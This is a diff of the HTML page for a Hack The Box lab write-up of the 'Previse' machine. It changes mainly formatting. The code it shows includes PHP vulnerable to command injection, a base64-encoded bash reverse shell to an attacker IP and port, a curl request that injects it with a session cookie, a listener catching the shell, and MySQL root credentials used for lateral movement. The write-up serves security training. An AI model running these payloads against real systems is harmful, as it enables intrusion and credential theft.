@@ -12,13 +12,13 @@
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://7rocky.github.io/en/htb/previse/"><meta property="article:section" content="htb">
 <meta property="article:published_time" content="2022-01-08T00:00:00+01:00">
-<meta property="article:modified_time" content="2022-03-03T13:35:23+01:00"><meta property="og:site_name" content="7Rocky">
+<meta property="article:modified_time" content="2022-03-03T18:25:10+01:00"><meta property="og:site_name" content="7Rocky">
 <meta property="og:image" content="https://7rocky.github.io/images/HTB/Previse/Previse.png">
 <meta property="og:author" content="7Rocky">
 <meta itemprop=name content="Previse">
 <meta itemprop=description content="Hack The Box. Linux. Easy machine. This machine has a webpage vulnerable to command injection after bypassing redirects and managing to register a new account. After that, a hash must be cracked to login as a low privileged user and perform a PATH hijacking using sudo. Common web pentesting and Burp Suite skills, as well as common privilege escalation techniques are needed to compromise the machine. This write-up uses a custom Go program to automate the foothold process"><meta itemprop=datePublished content="2022-01-08T00:00:00+01:00">
-<meta itemprop=dateModified content="2022-03-03T13:35:23+01:00">
-<meta itemprop=wordCount content="1701">
+<meta itemprop=dateModified content="2022-03-03T18:25:10+01:00">
+<meta itemprop=wordCount content="1702">
 <meta itemprop=keywords content="php,sudo,path-hijacking,command-injection,rce,hash-cracking,">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="Previse">
@@ -130,7 +130,7 @@ $
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
 </span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>| ssh-hostkey:
 </span></span><span style=display:flex><span>|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
 </span></span><span style=display:flex><span>|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
 </span></span><span style=display:flex><span>|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
@@ -138,15 +138,15 @@ $
 </span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
 </span></span><span style=display:flex><span>| http-title: Previse Login
 </span></span><span style=display:flex><span>|_Requested resource was login.php
-</span></span><span style=display:flex><span>| http-cookie-flags: 
-</span></span><span style=display:flex><span>|   /: 
-</span></span><span style=display:flex><span>|     PHPSESSID: 
+</span></span><span style=display:flex><span>| http-cookie-flags:
+</span></span><span style=display:flex><span>|   /:
+</span></span><span style=display:flex><span>|     PHPSESSID:
 </span></span><span style=display:flex><span>|_      httponly flag not set
 </span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 58.91 seconds
-</span></span></code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.104</code>, we are redirected to a login form:</p><p><img src=/images/HTB/Previse/Previse-login.png alt="Previse login"></p><p>Let&rsquo;s apply fuzzing to enumerate more routes. We can add <code>.php</code> extensions just in case:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php
+</span></span></code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id=web-enumeration>Web enumeration</h2><p>If we go to <code>http://10.10.11.104</code>, we are redirected to a login form:</p><p><img src=/images/HTB/Previse/Previse-login.png alt="Previse login"></p><p>Let&rsquo;s apply fuzzing to enumerate more routes. We can add <code>.php</code> extensions just in case:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php  
 index.php               [Status: <span class=code-blue>302</span>, Size: 2801, Words: 737, Lines: 72]
 download.php            [Status: <span class=code-blue>302</span>, Size: 0, Words: 1, Lines: 1]
 login.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
@@ -161,7 +161,7 @@ logout.php              [Status: <span class=code-blue>302</span>, Size: 0, Word
 accounts.php            [Status: <span class=code-blue>302</span>, Size: 3994, Words: 1096, Lines: 94]
 config.php              [Status: <span class=code-dark-green>200</span>, Size: 0, Words: 1, Lines: 1]
 logs.php                [Status: <span class=code-blue>302</span>, Size: 0, Words: 1, Lines: 1]
-</code></pre></div><p>Notice that there are a lot of 302 status (302 Found). This means that the server is redirecting to <code>/login.php</code>. We can tell <code>ffuf</code> to follow redirects with <code>-r</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php -r
+</code></pre></div><p>Notice that there are a lot of 302 status (302 Found). This means that the server is redirecting to <code>/login.php</code>. We can tell <code>ffuf</code> to follow redirects with <code>-r</code> flag:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php -r  
 index.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
 download.php            [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
 login.php               [Status: <span class=code-dark-green>200</span>, Size: 2224, Words: 486, Lines: 54]
@@ -195,81 +195,81 @@ logs.php                [Status: <span class=code-dark-green>200</span>, Size: 2
 ├── siteBackup.zip
 └── status.php
 
-0 directories, 14 files
-</code></pre></div><p>In <code>config.php</code> we can find MySQL credentials:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>connectDB</span>() {
-</span></span><span style=display:flex><span>    $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
-</span></span><span style=display:flex><span>    $user <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;root&#39;</span>;
-</span></span><span style=display:flex><span>    $passwd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;mySQL_p@ssw0rd!:)&#39;</span>;
-</span></span><span style=display:flex><span>    $db <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;previse&#39;</span>;
-</span></span><span style=display:flex><span>    $mycon <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>mysqli</span>($host, $user, $passwd, $db);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $mycon;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>And we see a weird hashing method for passwords in <code>login.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span>$users <span style=color:#f92672>=</span> $result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
-</span></span><span style=display:flex><span>$passHash <span style=color:#f92672>=</span> $users[<span style=color:#e6db74>&#39;password&#39;</span>];
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>crypt</span>($password, <span style=color:#e6db74>&#39;$1$🧂llol$&#39;</span>) <span style=color:#f92672>==</span> $passHash) {
-</span></span><span style=display:flex><span>    $result<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>free</span>();
-</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> $users[<span style=color:#e6db74>&#39;username&#39;</span>];
-</span></span><span style=display:flex><span>    $result <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$result) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Oops! Something went wrong, try again later!&#39;</span>;
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>    $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>close</span>();
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: index.php&#39;</span>);
-</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;div class=&#34;uk-alert-danger&#34;&gt;Invalid Username or Password&lt;/div&gt;&#39;</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=foothold-on-the-machine>Foothold on the machine</h2><p>We can also find a file called <code>logs.php</code>, which executes a Python script using a system call, with a non-sanitized string:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>])) {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: login.php&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>) {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: login.php&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>;
-</span></span><span style=display:flex><span>}
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
-</span></span></span><span style=display:flex><span><span style=color:#75715e>//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
-</span></span></span><span style=display:flex><span><span style=color:#75715e>/////////////////////////////////////////////////////////////////////////////////////
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
-</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $output;
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>$filepath <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/var/www/out.log&#34;</span>;
-</span></span><span style=display:flex><span>$filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;out.log&#34;</span>;    
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_exists</span>($filepath)) {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Description: File Transfer&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Type: application/octet-stream&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Disposition: attachment; filename=&#34;&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>basename</span>($filepath)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&#34;&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Expires: 0&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Cache-Control: must-revalidate&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Pragma: public&#39;</span>);
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Content-Length: &#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>filesize</span>($filepath));
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>ob_clean</span>(); <span style=color:#75715e>// Discard data in the output buffer
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>flush</span>(); <span style=color:#75715e>// Flush system headers
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#a6e22e>readfile</span>($filepath);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
-</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>    <span style=color:#a6e22e>http_response_code</span>(<span style=color:#ae81ff>404</span>);
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
-</span></span><span style=display:flex><span>} 
-</span></span></code></pre></div><p>This line of code is vulnerable:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span>$output <span style=color:#f92672>=</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style=color:#e6db74>{</span>$_POST[<span style=color:#e6db74>&#39;delim&#39;</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>);
-</span></span></code></pre></div><p>Because we can put a semicolon and inject another command. For instance, we can connect to the server using a reverse shell with <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i >& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>
+0 directories, 14 files  
+</code></pre></div><p>In <code>config.php</code> we can find MySQL credentials:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>&lt;?php</span>
+
+<span class="mtk7 mtki">function</span> <span class=mtk8>connectDB</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+    <span class=mtk1>$host</span> <span class=mtk5>=</span> <span class=mtk4>'localhost'</span><span class=mtk1>;</span>
+    <span class=mtk1>$user</span> <span class=mtk5>=</span> <span class=mtk4>'root'</span><span class=mtk1>;</span>
+    <span class=mtk1>$passwd</span> <span class=mtk5>=</span> <span class=mtk4>'mySQL_p@ssw0rd!:)'</span><span class=mtk1>;</span>
+    <span class=mtk1>$db</span> <span class=mtk5>=</span> <span class=mtk4>'previse'</span><span class=mtk1>;</span>
+    <span class=mtk1>$mycon</span> <span class=mtk5>=</span> <span class=mtk5>new</span> <span class="mtk7 mtki">mysqli</span><span class=mtk1>($host,</span> <span class=mtk1>$user,</span> <span class=mtk1>$passwd,</span> <span class=mtk1>$db);</span>  
+    <span class=mtk5>return</span> <span class=mtk1>$mycon;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>And we see a weird hashing method for passwords in <code>login.php</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>$users</span> <span class=mtk5>=</span> <span class=mtk1>$result</span><span class=mtk5>-&gt;</span><span class=mtk8>fetch_assoc</span><span class=mtk1>();</span>
+<span class=mtk1>$passHash</span> <span class=mtk5>=</span> <span class=mtk1>$users[</span><span class=mtk4>'password'</span><span class=mtk1>];</span>
+<span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk7>crypt</span><span class=mtk1>($password,</span> <span class=mtk4>'$1$🧂llol$'</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk1>$passHash)</span> <span class=mtk1>{</span>
+    <span class=mtk1>$result</span><span class=mtk5>-&gt;</span><span class=mtk8>free</span><span class=mtk1>();</span>
+    <span class=mtk1>$_SESSION[</span><span class=mtk4>'user'</span><span class=mtk1>]</span> <span class=mtk5>=</span> <span class=mtk1>$users[</span><span class=mtk4>'username'</span><span class=mtk1>];</span>
+    <span class=mtk1>$result</span> <span class=mtk5>=</span> <span class=mtk1>$db</span><span class=mtk5>-&gt;</span><span class=mtk8>query</span><span class=mtk1>($sql);</span>
+    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>$result)</span> <span class=mtk1>{</span>
+        <span class=mtk7>echo</span> <span class=mtk4>'Oops!</span> <span class=mtk4>Something</span> <span class=mtk4>went</span> <span class=mtk4>wrong,</span> <span class=mtk4>try</span> <span class=mtk4>again</span> <span class=mtk4>later!'</span><span class=mtk1>;</span>
+    <span class=mtk1>}</span>
+    <span class=mtk1>$db</span><span class=mtk5>-&gt;</span><span class=mtk8>close</span><span class=mtk1>();</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Location:</span> <span class=mtk4>index.php'</span><span class=mtk1>);</span>
+<span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+    <span class=mtk7>echo</span> <span class=mtk4>'&lt;div</span> <span class=mtk4>class="uk-alert-danger"&gt;Invalid</span> <span class=mtk4>Username</span> <span class=mtk4>or</span> <span class=mtk4>Password&lt;/div&gt;'</span><span class=mtk1>;</span>  
+<span class=mtk1>}</span>
+</code></pre></div><h2 id=foothold-on-the-machine>Foothold on the machine</h2><p>We can also find a file called <code>logs.php</code>, which executes a Python script using a system call, with a non-sanitized string:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>&lt;?php</span>
+
+<span class=mtk7>session_start</span><span class=mtk1>();</span>
+<span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk7>isset</span><span class=mtk1>($_SESSION[</span><span class=mtk4>'user'</span><span class=mtk1>]))</span> <span class=mtk1>{</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Location:</span> <span class=mtk4>login.php'</span><span class=mtk1>);</span>
+    <span class=mtk5>exit</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+
+<span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>!</span><span class=mtk1>$_SERVER[</span><span class=mtk4>'REQUEST_METHOD'</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class=mtk4>'POST'</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Location:</span> <span class=mtk4>login.php'</span><span class=mtk1>);</span>
+    <span class=mtk5>exit</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+
+<span class=mtk3>//////////////////////////////////////////////////</span><span class=mtk3>///////////////////////////////////</span>  
+<span class=mtk3>//I</span> <span class=mtk3>tried</span> <span class=mtk3>really</span> <span class=mtk3>hard</span> <span class=mtk3>to</span> <span class=mtk3>parse</span> <span class=mtk3>the</span> <span class=mtk3>log</span> <span class=mtk3>delims</span> <span class=mtk3>in</span> <span class=mtk3>PHP,</span> <span class=mtk3>but</span> <span class=mtk3>python</span> <span class=mtk3>was</span> <span class=mtk3>SO</span> <span class=mtk3>MUCH</span> <span class=mtk3>EASIER//</span>
+<span class=mtk3>//////////////////////////////////////////////////</span><span class=mtk3>///////////////////////////////////</span>
+
+<span class=mtk1>$output</span> <span class=mtk5>=</span> <span class=mtk7>exec</span><span class=mtk1>(</span><span class=mtk4>"/usr/bin/python</span> <span class=mtk4>/opt/scripts/log_process.py</span> <span class=mtk4>{</span><span class=mtk1>$_POST</span><span class=mtk4>['delim']}"</span><span class=mtk1>);</span>
+<span class=mtk7>echo</span> <span class=mtk1>$output;</span>
+
+<span class=mtk1>$filepath</span> <span class=mtk5>=</span> <span class=mtk4>"/var/www/out.log"</span><span class=mtk1>;</span>
+<span class=mtk1>$filename</span> <span class=mtk5>=</span> <span class=mtk4>"out.log"</span><span class=mtk1>;</span>
+
+<span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk7>file_exists</span><span class=mtk1>($filepath))</span> <span class=mtk1>{</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Content-Description:</span> <span class=mtk4>File</span> <span class=mtk4>Transfer'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Content-Type:</span> <span class=mtk4>application/octet-stream'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Content-Disposition:</span> <span class=mtk4>attachment;</span> <span class=mtk4>filename="'</span><span class=mtk5>.</span><span class=mtk7>basename</span><span class=mtk1>($filepath)</span><span class=mtk5>.</span><span class=mtk4>'"'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Expires:</span> <span class=mtk4>0'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Cache-Control:</span> <span class=mtk4>must-revalidate'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Pragma:</span> <span class=mtk4>public'</span><span class=mtk1>);</span>
+    <span class=mtk7>header</span><span class=mtk1>(</span><span class=mtk4>'Content-Length:</span> <span class=mtk4>'</span> <span class=mtk5>.</span> <span class=mtk7>filesize</span><span class=mtk1>($filepath));</span>
+    <span class=mtk7>ob_clean</span><span class=mtk1>();</span> <span class=mtk3>//</span> <span class=mtk3>Discard</span> <span class=mtk3>data</span> <span class=mtk3>in</span> <span class=mtk3>the</span> <span class=mtk3>output</span> <span class=mtk3>buffer</span>
+    <span class=mtk7>flush</span><span class=mtk1>();</span> <span class=mtk3>//</span> <span class=mtk3>Flush</span> <span class=mtk3>system</span> <span class=mtk3>headers</span>
+    <span class=mtk7>readfile</span><span class=mtk1>($filepath);</span>
+    <span class=mtk5>die</span><span class=mtk1>();</span>
+<span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
+    <span class=mtk7>http_response_code</span><span class=mtk1>(</span><span class=mtk6>404</span><span class=mtk1>);</span>
+    <span class=mtk5>die</span><span class=mtk1>();</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>This line of code is vulnerable:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>$output</span> <span class=mtk5>=</span> <span class=mtk7>exec</span><span class=mtk1>(</span><span class=mtk4>"/usr/bin/python</span> <span class=mtk4>/opt/scripts/log_process.py</span> <span class=mtk4>{</span><span class=mtk1>$_POST</span><span class=mtk4>['delim']}"</span><span class=mtk1>);</span>  
+</code></pre></div><p>Because we can put a semicolon and inject another command. For instance, we can connect to the server using a reverse shell with <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>echo</span> -n <span class=code-dark-yellow>'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0>&1'</span> | <span class=code-dark-green>base64</span>  
 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
-</code></pre></div><p>To make the request from <code>curl</code>, we must add the cookie to keep our session:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://10.10.11.104/logs.php -d <span class=code-dark-yellow>'delim=comma; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span> -H <span class=code-dark-yellow>'Cookie: PHPSESSID=952sbct7uf71fvi95m0p2gvmvi'</span>
+</code></pre></div><p>To make the request from <code>curl</code>, we must add the cookie to keep our session:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://10.10.11.104/logs.php -d <span class=code-dark-yellow>'delim=comma; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash'</span> -H <span class=code-dark-yellow>'Cookie: PHPSESSID=952sbct7uf71fvi95m0p2gvmvi'</span>  
 </code></pre></div><p>And we receive the shell in <code>nc</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.11.104.
 Ncat: Connection from 10.10.11.104:55204.
-bash: cannot set terminal process group (1369): Inappropriate ioctl for device
+bash: cannot set terminal process group (1369): Inappropriate ioctl for device  
 bash: no job control in this shell
 www-data@previse:/var/www/html$ script /dev/null -c bash
 script /dev/null -c bash
@@ -286,13 +286,13 @@ www-data@previse:/var/www/html$ stty rows 50 columns 158
 </code></pre></div><p>The process of registering and account, entering as a new user and making the request with the malicious payload is automated in a Go program called <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Previse/foothold.go><code>foothold.go</code></a> (detailed explanation <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Previse#footholdgo>here</a>).</p><p>It can be run as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>go</span> run foothold.go 10.10.17.44 4444
 [+] Creating username: 'aBwbf8GZPk', with password: 'LqsgiuEoyV'
 [*] Registration successful
-[*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/
+[*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/  
 [!] Sent reverse shell. Check your nc listener
-</code></pre></div><h2 id=lateral-movement-to-user-m4lwhere>Lateral movement to user <code>m4lwhere</code></h2><p>Now it is time to own user <code>m4lwhere</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>www-data@previse:/var/www/html$ ls /home
+</code></pre></div><h2 id=lateral-movement-to-user-m4lwhere>Lateral movement to user <code>m4lwhere</code></h2><p>Now it is time to own user <code>m4lwhere</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>www-data@previse:/var/www/html$ ls /home  
 m4lwhere
-</code></pre></div><p>We can use the MySQL credentials found in <code>config.php</code> to connect to a database:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>www-data@previse:/var/www/html$ mysql -u root --password='mySQL_p@ssw0rd!:)'
+</code></pre></div><p>We can use the MySQL credentials found in <code>config.php</code> to connect to a database:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>www-data@previse:/var/www/html$ mysql -u root --password='mySQL_p@ssw0rd!:)'  
 
-mysql> show databases;
+mysql&gt; show databases;
 +--------------------+
 | Database           |
 +--------------------+
@@ -304,12 +304,12 @@ mysql> show databases;
 +--------------------+
 5 rows in set (0.01 sec)
 
-mysql> use previse;
+mysql&gt; use previse;
 Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
-mysql> show tables;
+mysql&gt; show tables;
 +-------------------+
 | Tables_in_previse |
 +-------------------+
